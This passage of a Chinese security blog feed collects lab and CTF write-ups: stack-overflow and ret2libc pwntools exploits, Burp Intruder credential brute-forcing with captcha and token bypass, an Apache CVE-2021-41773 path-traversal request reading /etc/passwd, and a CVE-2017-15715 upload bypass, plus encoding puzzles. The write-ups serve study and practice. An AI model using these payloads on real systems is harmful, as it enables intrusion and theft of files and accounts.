    <content type="html"><![CDATA[<h1 id="check一下"><a href="#check一下" class="headerlink" title="check一下"></a>check一下</h1><p><img src="https://s2.loli.net/2023/01/11/y54WUZt8iVqElTz.png" alt="image.png"></p><p>64位文件；Partial RELRO:got表可写；没开栈保护；开了NX(堆栈不可执行)；没开地址随机化</p><p>可以考虑rop绕过</p><h1 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h1><pre><code class="hljs">__int64 vuln(){char buf[160]; // [rsp+0h] [rbp-A0h] BYREFmemset(buf, 0, sizeof(buf)); // 初始化buf为0read(0, buf, 0xB1uLL); // 输入数据给buf,大小为0xb1return 0LL;}</code></pre><p>buf位置：0xa0</p><p><img src="https://s2.loli.net/2023/01/11/HuUZndD5fgVSwti.png" alt="image.png"></p><p>后门函数：</p><p><img src="https://s2.loli.net/2023/01/11/bsM2VL8nrkJAWay.png" alt="image.png"></p><pre><code class="hljs">backdoor地址：0x400762</code></pre><p>思路：利用栈溢出漏洞，劫持程序，执行后门函数进行提权。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><pre><code class="hljs">from pwn import *p= remote('61.147.171.105',49305)payload='a'*0xa0+'b'*8+p64(0x400762) # 填充0xa8大小的垃圾数据，覆盖返回地址执行后门函数p.sendline(payload)p.interactive()</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;check一下&quot;&gt;&lt;a href=&quot;#check一下&quot; class=&quot;headerlink&quot; title=&quot;check一下&quot;&gt;&lt;/a&gt;check一下&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2023/01/11/y54WUZt8i</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://sinky.top/tags/PWN/"/>
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>Pikachu-暴力破解</title>
    <link href="https://sinky.top/2023/01/10/pikachu-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <id>https://sinky.top/2023/01/10/pikachu-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</id>
    <published>2023-01-10T06:40:29.819Z</published>
    <updated>2023-01-17T01:58:15.047Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>使用大量认证信息在认证接口进行尝试登录，直到得到正确结果，一般会使用带有字典的工具进行自动化操作。</p><p>认证安全策略：</p><ol><li>是否要求用户设置复杂的密码</li><li>是否每次认证都使用安全的验证码或手机otp</li><li>是否对尝试登录的行为进行判断和限制</li><li>是否采用了双因素认证</li></ol><p>等等。</p><h1 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h1><p>无验证码干扰，可以直接使用常用名撞库用户和密码：</p><p>随意输入用户名密码，bp抓包，将数据包发送至Intruder(测试器)</p><p>打开位置，选择集束炸弹为攻击类型，将用户名和密码设置为撞库的变量</p><p><img src="https://s2.loli.net/2023/01/10/pLkhFYa5gNzR9IV.png" alt="image.png"></p><p>打开有效载荷，如图设置有效负载集1，添加用户名列表（随便输入常用用户名）：</p><p><img src="https://s2.loli.net/2023/01/10/yMEucQ2VdOx8HFG.png" alt="image.png"></p><p>切换有效负载集为2，如图添加常用密码列表：</p><p><img src="https://s2.loli.net/2023/01/10/F7UmLvdDWlIH8cq.png" alt="image.png"></p><p>开始攻击</p><p><img src="https://s2.loli.net/2023/01/10/741KfjTqZbowcAO.png" alt="image.png"></p><p>只有admin/123456组合的响应串长度不同，说明它是正确的。</p><h2 id="拓展：攻击类型"><a href="#拓展：攻击类型" class="headerlink" title="拓展：攻击类型"></a>拓展：攻击类型</h2><ul><li>狙击手(Sniper): 一次只使用一个payload位置</li><li>攻城锤(Battering ram): 一个payload替换所有标记位置</li><li>音叉(Pitchfork): 多组payload组合</li><li>集束炸弹(Cluster bomb): 多组payload笛卡尔积组合</li></ul><h1 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h1><p>随意输入用户名和密码，输入正确验证码，bp抓包，发送到重发器分析。</p><p>当修改用户名为其他字符时，回显依旧是<code>username or password is not exists～</code>，而不是验证码错误，说明验证码没有刷新，可以一直使用，</p><p><img src="https://s2.loli.net/2023/01/10/7DMVzitfUIGaypJ.png" alt="image.png"></p><p>按照上文，选择用户名和密码为变量，进行撞库攻击，获取正确的账户密码。</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>提交的验证码会被与存储在服务器session中的验证码做验证，但由于在验证完成之后，没有及时销毁session，使用过的session值仍然可以重复使用。</p><h1 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h1><p>验证码是js随机生成，只在前端处理，没有传值给后端。</p><p><img src="https://s2.loli.net/2023/01/10/cClQVaUKkA4xPn2.png" alt="image.png"></p><p>步骤如验证码绕过(on server)</p><h1 id="token防爆破？"><a href="#token防爆破？" class="headerlink" title="token防爆破？"></a>token防爆破？</h1><p>客户端token跟随用户名和密码一起提交给服务器并且与服务器端token值进行对比，那么也就意味着每次客户端请求服务器都会进行token值校验是否正确。</p><p>每次请求前需要把上一次请求的响应包获取，将token值截取，实现绕过。</p><p>随意输入用户名密码，bp抓包，发送到测试器。</p><p>选择音叉(Pitchfork)攻击。</p><p>修改用户名为admin,选择passwd和token为变量。</p><p><img src="https://s2.loli.net/2023/01/10/BqG5USE3rX1L9Hh.png" alt="image.png"></p><p>打开选项，找到grep-extract功能，勾选“从响应中提取以下项目”，点击添加</p><p><img src="https://s2.loli.net/2023/01/10/i2c6T5VJaYbCqGd.png" alt="image.png"></p><p>如图填写，获得回复，复制token值。</p><p>找到重定向，改为<code>总是</code></p><p>找到请求引擎，改线程数为1</p><p>回到有效载荷页面：</p><p><img src="https://s2.loli.net/2023/01/10/YyDKFziaLZs8eAG.png" alt="image.png"></p><p>在有效负载集2中，选择递归搜索，添加token值：</p><p><img src="https://s2.loli.net/2023/01/10/P2f4DE7xLNalIcr.png" alt="image.png"></p><p>开始攻击</p><p><img src="https://s2.loli.net/2023/01/10/KzChpti9kj3AMm2.png" alt="image.png"></p><p>得到用户名密码。</p><h2 id="拓展：Token"><a href="#拓展：Token" class="headerlink" title="拓展：Token"></a>拓展：Token</h2><p>token在计算机身份认证中是令牌(临时)的意思，一般在网站上用于身份验证，流程如下：</p><ol><li>客户端使用用户名密码请求登录</li><li>服务端收到请求，去验证用户名密码</li><li>验证成功后，服务端签发一个token，并将其发送给客户端</li><li>客户端收到后将token存储起来</li><li>客户端每次向服务端请求资源的时候需要带着服务端签发的token</li><li>服务端收到请求，去验证客户端请求里面带着的token，验证成功后向客户端返回请求的数据</li><li>app登录时发送加密的用户名密码到服务器，服务器验证用户名密码，成功后以某种方式作为token存储到服务器中，并返回token到app，以后app请求时，凡需要验证的地方都要带上该token。后服务器端验证token，成功返回所需要的结果，失败返回错误信息，让他重新登录。其中服务器上token设置一个有效期，每次APP请求的时候都验证token和有效期。</li></ol><p><a href="https://www.cnblogs.com/WangwangDui652/p/16498186.html">https://www.cnblogs.com/WangwangDui652/p/16498186.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;使用大量认证信息在认证接口进行尝试登录，直到得到正确结果，一般会使用带有字典的工具进行自动化操作。&lt;/p&gt;
&lt;p&gt;认证安全策略：&lt;/p&gt;
&lt;</summary>
      
    
    
    
    
    <category term="pikachu" scheme="https://sinky.top/tags/pikachu/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="暴力破解" scheme="https://sinky.top/tags/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>vulhub之CVE-2021-41773</title>
    <link href="https://sinky.top/2023/01/09/vulhub%E4%B9%8BCVE-2021-41773/"/>
    <id>https://sinky.top/2023/01/09/vulhub%E4%B9%8BCVE-2021-41773/</id>
    <published>2023-01-09T08:49:36.419Z</published>
    <updated>2023-01-11T05:32:15.146Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h1><p>Apache HTTP Server 2.4.49上引入的漏洞，该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文件系统上的任意文件。</p><p>apache-CVE-2021-41773漏洞利用的用户身份为<code>httpd.conf</code>中指定的用户，可以执行该用户对应身份权限的读写。</p><p>原理：</p><p>使用<code>ap_normalize_path</code>函数在对路径参数进行规范化时会先进行url解码，然后判断是否存在<code>../</code>的路径穿越符。</p><p>当检测到路径中存在<code>%</code>字符时，如果紧跟的2个字符是十六进制字符，就会进行url解码，将其转换成标准字符，如<code>%2e</code>通过url解码之后是一个点(.)对于路径的url解码之后再来判断是否存在<code>../</code></p><p>如果路径中存在<code>%2e./</code>形式，就会检测到，因为遍历第一个字符是<code>%</code>紧跟2个字符是十六进制那么会被转换成点，这样会和后面的<code>./</code>就会连成<code>../</code>这样就会被拦截，但是出现<code>.%2e/</code>这种形式时，在遍历到第一个<code>.</code>字符时，此时检测到后面的两个字符是<code>%2</code>，那么就构造不成../而是.%2，就不会把它当作路径穿越符处理，也就是说在检测是否有路径穿越符之后，%2e再解码变成了点，最终.%2e/解码成了../。因此可以使用.%2e/或者%2e%2e绕过对路径穿越符的检测。</p><p>(什么鬼，不太明白)</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p><img src="https://s2.loli.net/2023/01/10/HpYVbL5JqxchAtF.png" alt="image.png"></p><p>poc:</p><pre><code class="hljs">GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</code></pre><h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>增加ap_normalize_path函数的判断条件，对于.%2e或者%2e%2e进行判断，避免绕过</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞详情&quot;&gt;&lt;a href=&quot;#漏洞详情&quot; class=&quot;headerlink&quot; title=&quot;漏洞详情&quot;&gt;&lt;/a&gt;漏洞详情&lt;/h1&gt;&lt;p&gt;Apache HTTP Server 2.4.49上引入的漏洞，该漏洞允许攻击者绕过路径遍历保护，使用编码并读取网络服务器文</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulhub:CVE-2017-15715</title>
    <link href="https://sinky.top/2023/01/06/vulhub%EF%BC%9ACVE-2017-15715/"/>
    <id>https://sinky.top/2023/01/06/vulhub%EF%BC%9ACVE-2017-15715/</id>
    <published>2023-01-06T06:02:48.734Z</published>
    <updated>2023-01-09T01:21:23.184Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>Apache HTTPD换行解析漏洞。</p><p>Apache在2.4.0-2.4.29版本中存在一个解析漏洞，程序在解析php时，若文件名最后有一个换行符<code>x0A</code>,apache依然会将其当成php解析，但是在上传文件时可以成功绕过黑名单。</p><p>如果上传文件的php程序是设置的白名单，那么这个漏洞将无法利用。</p><h1 id="漏洞利用实操"><a href="#漏洞利用实操" class="headerlink" title="漏洞利用实操"></a>漏洞利用实操</h1><p>构造文件1.php</p><p>内容：</p><pre><code class="hljs">&lt;?php    phpinfo();?&gt;</code></pre><p>上传：</p><p><img src="https://s2.loli.net/2023/01/06/qDdvEzKGwoeUHh7.png" alt="image.png"></p><p>返回<code>bad file</code></p><p>打开bp抓包，把包发送到重发器</p><p>切换Hex，找到1.php</p><p><img src="https://s2.loli.net/2023/01/06/gnXfeHpDcdyjhR5.png" alt="image.png"></p><p>在70后添加个<code>0a</code>,然后点击发送，此时回显已经没有<code>bad file</code>了</p><p><img src="https://s2.loli.net/2023/01/06/bYJRr47gGAdh5pl.png" alt="image.png"></p><p>访问<code>http://ip:8080/1.php%0a</code></p><p>成功看到phpinfo信息，说明apache解析了<code>1.php%0a</code></p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>apache配置文件中，将以<code>.php</code>结尾的文件都进行解析，但<code>$</code>符号会匹配换行符</p><p><img src="https://s2.loli.net/2023/01/06/xW9NL6Y5TjVna1E.png" alt="image.png"></p><p>即<code>.php</code>加上换行符就能被解析成php文件</p><blockquote><p>0x0a是换行符的ascii码，换行符是控制字符，所以修改数据包的十六进制来达到插入换行符的目的</p></blockquote><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>对中间件进行升级</li><li>对上传文件重命名</li><li>上传时采用白名单的验证方式</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h1&gt;&lt;p&gt;Apache HTTPD换行解析漏洞。&lt;/p&gt;
&lt;p&gt;Apache在2.4.0-2.4.29版本中存在一个解析漏洞，程序在解</summary>
      
    
    
    
    
    <category term="vulhub" scheme="https://sinky.top/tags/vulhub/"/>
    
    <category term="靶场" scheme="https://sinky.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
    <category term="换行解析漏洞" scheme="https://sinky.top/tags/%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界CTF-Misc2</title>
    <link href="https://sinky.top/2023/01/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc2/"/>
    <id>https://sinky.top/2023/01/04/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CCTF-Misc2/</id>
    <published>2023-01-04T06:45:17.135Z</published>
    <updated>2023-01-11T06:44:20.920Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc1"><a href="#Misc1" class="headerlink" title="Misc1"></a>Misc1</h1><p>题目：<code>d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd</code></p><p>以为是十六进制转文本，失败</p><p>看一下组成：数字+字母a-f</p><p>转ascii乱码，应该偏移了，一般是偏移128</p><pre><code class="hljs">s = 'd4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9e1e6b3e3b9e4b3b7b7e2b6b1e4b2b6b9e2b1b1b3b3b7e6b3b3b0e3b9b3b5e6fd'hex_new = ''for i in range(0,len(s),2):    hex_ = s[i:i+2]    d_ = int('0x'+ hex_, 16)    d_surplus = d_%128    temp = hex(d_surplus)[2:4]    hex_new+=tempprint(str(hex_new))</code></pre><p>结果转字符串得到flag:</p><pre><code class="hljs"> DDCTF{9af3c9d377b61d269b11337f330c935f}</code></pre><h1 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h1><p>密文：</p><pre><code class="hljs">4O595954494Q32515046324757595N534R52415653334357474R4N575955544R4O5N4Q46434S4O59474253464Q5N444R4Q51334557524O5N4S424944473542554O595N44534O324R49565746515532464O49345649564O464R4R494543504N35</code></pre><p>rot13解密：</p><pre><code class="hljs">4B595954494D32515046324757595A534E52415653334357474E4A575955544E4B5A4D46434F4B59474253464D5A444E4D51334557524B5A4F424944473542554B595A44534B324E49565746515532464B49345649564B464E4E494543504A35</code></pre><p>base16解密：</p><pre><code class="hljs">KYYTIM2QPF2GWYZSNRAVS3CWGNJWYUTNKZMFCOKYGBSFMZDNMQ3EWRKZOBIDG5BUKYZDSK2NIVWFQU2FKI4VIVKFNNIECPJ5</code></pre><p>base32解密：</p><pre><code class="hljs">V143Pytkc2lAYlV3SlRmVXQ9X0dVdmd6KEYpP3t4V29+MElXSER9TUEkPA==</code></pre><p>base64解密：</p><pre><code class="hljs">W^7?+dsi@bUwJTfUt=_GUvgz(F)?{xWo~0IWHD}MA$&lt;</code></pre><p>看起来乱七八糟的，看wp，得知是base85解密：</p><p>没找到能解密的网站，找到了脚本解密一下：</p><pre><code class="hljs">import base64a = "W^7?+dsi@bUwJTfUt=_GUvgz(F)?{xWo~0IWHD}MA$&lt;"b = base64.b85decode(a)print(b)</code></pre><p>flag:</p><pre><code class="hljs">flag{W0w_y0u_c4n_rea11y_enc0d1ng!}</code></pre><h1 id="Banmabanma"><a href="#Banmabanma" class="headerlink" title="Banmabanma"></a>Banmabanma</h1><p>图片题：</p><p>给了一个看上去很像条形码的图片，扫码扫不出来</p><p>用这个网站可以识别：</p><p><a href="https://online-barcode-reader.inliteresearch.com/">https://online-barcode-reader.inliteresearch.com/</a></p><h1 id="适合作为桌面"><a href="#适合作为桌面" class="headerlink" title="适合作为桌面"></a>适合作为桌面</h1><p>（做完之后心里只有一个疑问，这难度竟然攻防世界只给了一级？菜鸟瑟瑟发抖）</p><p>拿到手是一个图片</p><p><img src="https://s2.loli.net/2023/01/11/84aX3jb5AEzGYIr.png" alt="image.png"></p><p>图片隐写，先扔到binwalk看一下有无隐藏信息。</p><p><img src="https://s2.loli.net/2023/01/11/IqeRWv8GMQE3tjV.png" alt="image.png"></p><p>用StegSolve打开：切换一下通道，发现一个二维码：</p><p><img src="https://s2.loli.net/2023/01/11/scRdeHBQ951jLXw.png" alt="image.png"></p><p>扫了一下，出现一大堆数据，扔到图片解析网站，就是上文那个网站，得到一堆数据，选择<code>QR code</code>项。</p><p><img src="https://s2.loli.net/2023/01/11/dkFYDHEmlSLIvOU.png" alt="image.png"></p><p>复制成txt，扔到winhex中，<code>ctrl+R</code> 选择ASCII转二进制</p><p><img src="https://s2.loli.net/2023/01/11/unciTSlHqLvR7Fz.png" alt="image.png"></p><p>这一步我也不知道怎么观察到的，我看了大佬的wp</p><p>保存为1.pyc文件，用uncompyle6反编译为1.py</p><blockquote><p>uncompyle6安装：<code>pip install uncompyle6</code></p></blockquote><p>打开命令行反编译：<code>uncompyle6 -o 路径\1.py 路径\1.pyc</code></p><p>得到脚本，简单修改一下：</p><pre><code class="hljs">def flag():    str = [102, 108, 97, 103, 123, 51, 56, 97, 53, 55, 48, 51, 50,48, 56, 53, 52, 52, 49, 101, 55, 125]    flag = ''    for i in str:        flag += chr(i)    print(flag)flag()</code></pre><p>运行得到flag:<code>flag{38a57032085441e7}</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Misc1&quot;&gt;&lt;a href=&quot;#Misc1&quot; class=&quot;headerlink&quot; title=&quot;Misc1&quot;&gt;&lt;/a&gt;Misc1&lt;/h1&gt;&lt;p&gt;题目：&lt;code&gt;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://sinky.top/tags/CTF/"/>
    
    <category term="攻防世界" scheme="https://sinky.top/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    <category term="Misc" scheme="https://sinky.top/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>基本ROP之ret2libc</title>
    <link href="https://sinky.top/2022/12/09/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2libc/"/>
    <id>https://sinky.top/2022/12/09/%E5%9F%BA%E6%9C%ACROP%E4%B9%8Bret2libc/</id>
    <published>2022-12-09T05:23:07.171Z</published>
    <updated>2023-01-10T06:38:33.644Z</updated>
    
    <content type="html"><![CDATA[<p>程序下载：<a href="https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw">https://pan.baidu.com/s/1rrz6u-w_TlmQcdQrU_rZlw </a><br>提取码：rc47</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>ret2libc 即控制函数执行libc中的函数，通常是返回至某个函数的plt处或者函数的具体位置(即函数对应的got表项的内容)。通常情况下，会选择执行<code>system('/bin/sh')</code>，所以需要先直到system函数的地址。</p><p>忘了plt啥是啥了，回忆一下：</p><h2 id="Got-Plt表"><a href="#Got-Plt表" class="headerlink" title="Got,Plt表"></a>Got,Plt表</h2><ul><li>got: 全局偏移表，用于存储外部函数在内存的确切地址，got表存储在数据段内，可以在程序运行中被修改。</li><li>plt: 程序链接表，用于存储外部函数的入口点，即程序总会到plt寻找外部函数的地址，plt存储在代码段内，在运行之前就已经确定并且不会被修改，所以plt不会知道程序运行时动态链接库被加载的确切位置。</li><li>plt表内存储的入口点就是got表中对应条目的地址</li><li>got表初始值都指向plt表对应条目中的某个片段，该片段的作用是调用一个函数地址解析函数，如果是第一次调用这个函数，程序会通过got表再次跳转回plt表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉got表初始值，之后再执行函数调用。当再次调用这个函数，程序仍然首先通过plt表跳转到got表，此时got表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数</li></ul><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><ol><li>当程序中没有<code>/bin/sh</code>时,可以利用程序中某些函数如:<code>read``fgets``gets</code>等函数将<code>/bin/sh</code>写入bss段或某个变量中,找到其地址.</li><li>对于只给了libc.so文件的程序,可以直接在libc.so文件中去找system()函数和<code>/bin/sh</code></li><li>没有给libc.so的程序,可以通过泄露程序中某个函数的地址,通过查询来找出其使用libc.so版本</li></ol><h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>checksec查看：</p><p><img src="https://s2.loli.net/2022/12/09/6H4z2hNIy5mSOrQ.png" alt="image.png"></p><p>32位，got表可写，没开栈保护和地址随机，开启了NX(不可执行)</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>IDA分析：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>{<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-64h] BYREF</span><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"RET2LIBC &gt;_&lt;"</span>);<br>  <span class="hljs-built_in">gets</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>gets()函数，存在栈溢出漏洞。</p><p>查看字符串：</p><pre><code class="hljs">`/bin/sh`：0x08048720system: 0x08048460</code></pre><p>算偏移量，然后溢出到后门函数，就ok啦</p><p>看一下call gets()的地址：</p><p><img src="https://s2.loli.net/2022/12/09/6yR149KtDrTj8fx.png" alt="image.png"></p><p>gdb中下断点运行：</p><pre><code class="hljs">b *0x0804867E</code></pre><p><img src="https://s2.loli.net/2022/12/09/E4a2SyeiWoKLJcB.png" alt="image.png"></p><p>偏移量不对，看了一下wp</p><pre><code class="hljs">char s[100]; // [esp+1Ch] [ebp-64h] BYREF</code></pre><p>system在.plt段，调用plt中函数时需要在栈中部署两个参数，第一个是system执行后的返回地址，第二个是system函数中的参数。</p><p><img src="https://s2.loli.net/2022/12/12/mzOZa1Ipe7MLSXW.png" alt="image.png"></p><p>栈构造如图，s变量距离esp指针0x1Ch,距离ebp指针0x64h,所以偏移量为<code>ebp-(esp+1C)+4=112</code></p><p>还是不太理解，一般eax是存储返回地址的，所以偏移量就是<code>ebp-eax+4=112</code></p><p><img src="https://s2.loli.net/2022/12/12/7x6h2lSs5EoIvpr.png" alt="image.png"></p><p>我看pwndbg可以直接得到偏移量，但是这边网络不能访问Github,等回家吧。</p><p><img src="https://s2.loli.net/2022/12/12/kjANIc2O3qZJM7e.png" alt="image.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs">from&nbsp;pwn&nbsp;import&nbsp;*p&nbsp;=&nbsp;process("./ret2libc1")system_plt&nbsp;=&nbsp;0x08048460bin_sh&nbsp;=&nbsp;0x08048720payload&nbsp;=&nbsp;flat(['a'*112,system_plt,'b'*4,bin_sh])p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/12/p4sCBbRmZf6TcAQ.png" alt="image.png"></p><h1 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h1><p><img src="https://s2.loli.net/2022/12/12/kJrzahF3b8gH4iU.png" alt="image.png"></p><p>32位，got表可写，开NX.</p><p>IDA分析：</p><p>main函数：</p><pre><code class="hljs">int __cdecl main(int argc, const char **argv, const char **envp){    char s[100]; // [esp+1Ch] [ebp-64h] BYREF    setvbuf(stdout, 0, 2, 0);    puts("Something surprise here, but I don't think it will work.");    printf("What do you think ?");    gets(s);    return 0;}</code></pre><p>有system</p><p>无<code>/bin/sh</code></p><p>需要自己来读取字符串，不会，看一看wp.</p><blockquote><p>思路：用gets输入system()的参数<code>/bin.sh</code></p></blockquote><p><img src="https://s2.loli.net/2022/12/12/l7aHPDZVyrvf148.png" alt="image.png"></p><pre><code class="hljs">gets_plt=0x08048460system_plt=0x08048490</code></pre><p>去bss段瞅瞅能用的变量：</p><p><img src="https://s2.loli.net/2022/12/12/IgaFqz2HrBwl1uh.png" alt="image.png"></p><p>看到了一个小可爱<code>buf2 (0x0804A080)</code></p><p>用gadget找ret语句：</p><pre><code class="hljs">ROPgadget --binary ret2libc2 --only 'pop|ret'</code></pre><p><img src="https://s2.loli.net/2022/12/12/7CTqJBtcA2Ov6aF.png" alt="image.png"></p><p>选择:</p><pre><code class="hljs">0x0804843d : pop ebx ; ret</code></pre><p>因为其他的只有<code>pop ebx</code>，没有<code>pop eax</code></p><p>算一下偏移吧，做到这里我甚至不知道自己干啥呢……没咋明白。</p><p>在gets()处断点：</p><pre><code class="hljs">b *0x080486BA</code></pre><p>运行：</p><p><img src="https://s2.loli.net/2022/12/12/9ptqKDe4fdr6bWi.png" alt="image.png"></p><pre><code class="hljs">EAX: 0xffffd49cEBP: 0xffffd508ESP: 0xffffd480</code></pre><p>跟ret2libc1一样，偏移就是112（用pwndbg爆出来也行<code>cyclic -l </code>）</p><p>栈结构一般是：</p><p><img src="https://s2.loli.net/2022/12/12/GHh9JYdNcVAWolx.png" alt="image.png"></p><p>本题栈结构：</p><p><img src="https://s2.loli.net/2022/12/12/n4vCXK6zgs2TGON.png" alt="image.png"></p><pre><code class="hljs">payload=flat(['a'*112,gets_plt,system_plt,buf2,buf2,'/bin/sh'])</code></pre><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre><code class="hljs">from pwn import *p=process('./ret2libc2')system_plt=0x08048490gets_plt=0x08048460buf2=0x0804A080payload=flat(['a'*112,gets_plt,system_plt,buf2,buf2,'/bin/sh'])p.sendline(payload)p.interactive()</code></pre><p><img src="https://s2.loli.net/2022/12/12/rU2kWYJIMHNz9Bw.png" alt="image.png"></p><p>成功！！！！</p><p>虽然不大明白，但是大概明白……</p><h1 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h1><p>隔了一个月才做这个例子……前面的简单复习了一遍，怎么感觉阳完之后脑袋空空</p><p>checksec检查：</p><p><img src="https://s2.loli.net/2023/01/09/hduM6E7Fl8Hkmw1.png" alt="image.png"></p><p>32位文件，没开栈保护，没有地址随机化，开了NX(堆栈不可执行)</p><p>ida分析：</p><p>main()函数：</p><p><img src="https://s2.loli.net/2023/01/09/7O8p3RI6bkPKXeL.png" alt="image.png"></p><p>gets() 存在栈溢出</p><p>查了一下，没有后门函数，也没有字符串<code>/bin/sh</code></p><h2 id="目的："><a href="#目的：" class="headerlink" title="目的："></a>目的：</h2><ol><li>找system函数地址</li><li>找<code>/bin/sh</code>字符串地址</li></ol><blockquote><p>拓展:</p><p>system函数属于libc,而libc.so动态链接库中的函数之间相对偏移是固定的.</p><p>即使程序开启ASLR保护,也只是针对地址中间位进行随机,最低的12位并不会发生改变</p><p>libc归纳:<a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></p></blockquote><p>通过确定libc中某个函数的地址,确定该程序利用的libc版本,进而确定system函数的地址.</p><p>利用got表泄露,输出某个函数对应的got表项的内容 (由于libc延迟绑定机制,需要泄露已经执行过的函数地址)</p><h2 id="libc的延迟绑定"><a 